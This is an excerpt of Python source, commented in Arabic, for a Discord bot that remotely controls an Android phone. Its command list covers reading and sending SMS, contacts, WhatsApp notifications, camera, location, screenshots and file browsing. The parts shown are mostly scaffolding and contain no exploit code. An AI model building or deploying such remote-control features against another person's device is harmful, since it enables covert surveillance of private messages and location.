"""
Hawkmoth Bot v2.0 - النسخة الجبارة الكاملة.

الميزات:
  - 51 أمرًا (47 أصلي + 4 جديدة)
  - عرض الصلاحيات في /start
  - Cache ذكي للملفات (10x أسرع)
  - Rate Limiting
  - معالجة أخطاء متقدمة
  - إحصائيات
  - إعادة اتصال تلقائي
...
RATE_LIMIT_PER_MIN = cfg_int("RATE_LIMIT_PER_MIN", 20)
CACHE_TTL_SEC = cfg_int("CACHE_TTL_SEC", 30)
...
class Stats:
    ...
    def to_dict(self):
        ...
        return {
            ...
            "top_commands": sorted(self.commands_used.items(), key=lambda x: -x[1])[:10],
...
try:
    ...
    log.warning("⚠️ PIL غير متوفر — بدون ضغط")
...
def _rate_check(interaction):
    """فحص Rate Limit."""
    if not RATE_LIMITER.check(interaction.user.id):
        return False
    return True
...
class FileBrowserView(discord.ui.View):
    ...
    def title(self):
        ...
        return (
            f"📂 `{self.path}`\n"
            f"({start+1}-{end} من {self.total}) | {sort_label} | 🖥️ `{DEVICE_NAME}`"
        )
...
async def on_ready():
    ...
    log.info(f"🔔 Notifications: {'✅' if HAS_NOTIF_ACCESS else '❌'}")
...
# ==========================================================
# /start - النسخة المحسّنة مع الصلاحيات
# ==========================================================
...
async def start_cmd(interaction: discord.Interaction):
    ...
    # جلب الصلاحيات من Java
    perms = {}
    try:
        perms_raw = await asyncio.to_thread(bridge.get_permissions_json)
    ...
    perm_text = (
        "**📋 حالة الصلاحيات:**\n"
        f"{mark('all_files', 'الوصول الكامل للملفات')}\n"
        f"{mark('notifications', 'الوصول للإشعارات')}\n"
        f"{mark('media_images', 'قراءة الصور')}\n"
        f"{mark('media_video', 'قراءة الفيديو')}\n"
        f"{mark('media_audio', 'قراءة الصوتيات')}\n"
        f"{mark('sms_read', 'قراءة الرسائل')}\n"
        f"{mark('sms_send', 'إرسال الرسائل')}\n"
        f"{mark('contacts', 'جهات الاتصال')}\n"
        f"{mark('camera', 'الكاميرا')}\n"
        f"{mark('post_notifications', 'إشعارات التطبيق')}\n"
    )

    # حساب إجمالي الممنوح
    keys = ['all_files', 'notifications', 'media_images', 'media_video',
            'media_audio', 'sms_read', 'sms_send', 'contacts', 'camera',
            'post_notifications']
    ...
    await interaction.followup.send(
        f"🖥️ **{DEVICE_NAME}**\n"
        f"📱 Android {perms.get('android', '?')} (SDK {perms.get('sdk', '?')})\n"
        f"📊 الصلاحيات: **{granted}/{total}** ممنوحة\n\n"
        f"{perm_text}\n"
        f"**📁 المسارات:**\n"
        f"`{ALLOWED_ROOT}`\n"
        f"📥 `{UPLOAD_DIR}`\n"
        f"📸 `{SCREENSHOT_DIR}`\n"
        f"📚 جذور: **{len(DISCOVERED_ROOTS)}** | 🖼️ PIL: {'✅' if HAS_PIL else '❌'}\n\n"
        "**💬 واتساب:**\n"
        "`/wa` `/wa_home` `/notifications` `/notif_watch`\n"
        "`/sms` `/send_sms` `/contacts` `/dial`\n\n"
        "**📁 تصفح:**\n"
        ...
        "**ℹ️ معلومات:**\n"
        "`/ip` `/location` `/sysinfo` `/stats` `/ping` `/whoami`\n\n"
        "**🔧 صيانة:**\n"
        "`/clearcache`"
    )
...
async def stats_cmd(interaction: discord.Interaction):
    ...
    s = STATS.to_dict()
    top = "\n".join(f"`{name}`: {count}" for name, count in s["top_commands"])
    errors = "\n".join(f"`{name}`: {count}" for name, count in s["errors"].items()) or "لا شيء"
...
async def whoami_cmd(interaction: discord.Interaction):
    ...
    await interaction.response.send_message(
        f"👤 **{user.name}**\n"
        f"🆔 `{user.id}`\n"
        f"📅 الحساب منذ: `{created}`\n"
        f"✅ أنت المستخدم المصرّح"
    )
...
async def notifications_cmd(interaction: discord.Interaction,
    ...
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("notifications")
...
async def notif_watch_cmd(interaction: discord.Interaction, action: str = "status",
    ...
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("notif_watch")
